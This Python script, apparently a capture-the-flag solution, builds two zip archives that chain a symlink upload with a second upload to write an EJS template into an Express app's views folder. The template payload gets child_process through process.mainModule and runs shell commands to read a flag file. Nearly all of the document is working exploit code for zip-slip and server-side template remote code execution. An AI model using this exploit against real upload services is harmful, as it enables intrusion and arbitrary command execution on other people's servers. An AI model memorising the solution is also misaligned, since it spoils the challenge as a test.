#!/usr/bin/env python3
"""Build the two zip-slip-via-symlink exploit archives.

Layer in the deployed image:
  /app/uploads  (drwxrwxr-x 1001:1001)  <- unzip -o -d here
  /app/views    (drwxrwxr-t 0:1001)     <- group-writable by appuser (uid 1001)

The Express server (running as appuser via gosu) renders any /app/views/<name>.ejs
on GET /<name>. EJS executes embedded JS => RCE as appuser.

Flag lives at /flag-<20 hex>.txt, mode 0444 (world-readable), random name.
appuser can read it; we glob the random name in a shell.

Primitive: Info-ZIP unzip honors symlink entries but creates them LAST
("deferred symbolic links") within a single archive, so the file-through-symlink
write cannot happen in one shot. Split across TWO uploads — uploads/ persists
between requests:

  upload 1 (sym.zip):     x  ->  ../views        (symlink lands in uploads/)
  upload 2 (payload.zip): x/pwn.ejs              (x already a symlink-to-dir,
                                                  unzip writes THROUGH it
                                                  => /app/views/pwn.ejs)
"""
import sys
import zipfile

# `require` is not in scope inside compiled EJS templates, but `process` is a
# Node global, so reach child_process via process.mainModule. Fallback covers
# builds where mainModule is undefined.
PAYLOAD = r"""<%
var out = "";
try {
  var cp;
  try { cp = process.mainModule.require("child_process"); }
  catch (e) { cp = require("child_process"); }
  out = cp.execSync("cat /flag*.txt 2>/dev/null; cat /flag* 2>/dev/null").toString();
} catch (e) { out = "ERR:" + e.message; }
%>PWNSTART<%- out %>PWNEND
"""

SYMLINK_NAME = "x"
SYMLINK_TARGET = "../views"
PAYLOAD_PATH = "x/pwn.ejs"


def build_symlink_zip(path: str) -> None:
    with zipfile.ZipFile(path, "w", zipfile.ZIP_STORED) as z:
        zi = zipfile.ZipInfo(SYMLINK_NAME)
        zi.create_system = 3  # unix
        zi.external_attr = (0o120777 & 0xFFFF) << 16  # S_IFLNK | 0777
        z.writestr(zi, SYMLINK_TARGET)
    print(f"built {path} (symlink {SYMLINK_NAME} -> {SYMLINK_TARGET})")


def build_payload_zip(path: str) -> None:
    with zipfile.ZipFile(path, "w", zipfile.ZIP_STORED) as z:
        zi = zipfile.ZipInfo(PAYLOAD_PATH)
        zi.create_system = 3
        zi.external_attr = (0o100644 & 0xFFFF) << 16  # S_IFREG | 0644
        z.writestr(zi, PAYLOAD)
    print(f"built {path} (payload {PAYLOAD_PATH})")


if __name__ == "__main__":
    out = sys.argv[1] if len(sys.argv) > 1 else "."
    build_symlink_zip(f"{out}/sym.zip")
    build_payload_zip(f"{out}/payload.zip")
